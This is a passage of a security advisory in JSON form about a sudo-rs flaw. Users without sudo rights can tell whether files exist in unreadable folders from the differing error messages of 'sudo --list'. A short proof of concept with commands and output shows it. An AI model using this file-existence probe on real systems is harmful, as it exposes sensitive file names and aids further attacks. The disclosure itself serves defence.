  "summary": "sudo-rs Allows Low Privilege Users to Discover the Existence of Files in Inaccessible Folders",
  "details": "### Summary\n\nUsers with no (or very limited) sudo privileges can determine whether files exists in folders that they otherwise cannot access using `sudo --list \u003cpathname\u003e`.\n\n### PoC\n\nAs root:\n```\n# mkdir /tmp/foo\n# chmod a-rwx /tmp/foo\n# touch /tmp/foo/secret_file\n```\nAs a user without any (or limited) sudo rights:\n```\n$ sudo --list /tmp/foo/nonexistent_file\nsudo-rs: '/tmp/foo/nonexistent_file': command not found\n$ $ sudo --list /tmp/foo/secret_file\nsudo-rs: Sorry, user eve may not run sudo on host.\n```\nI.e. the user can distinguish whether files exist.\n\n### Related\nOriginal sudo (vulnerable version tested by us: 1.9.15p5) exhibited similar behaviour for files with the executable bit set.\n\n### Impact\nUsers with local access to a machine can discover the existence/non-existence of certain files, revealing potentially sensitive information in the file names. This information can also be used in conjunction with other attacks.\n\n### Credits\nThis issue was identified by sudo-rs developer Marc Schoolderman",
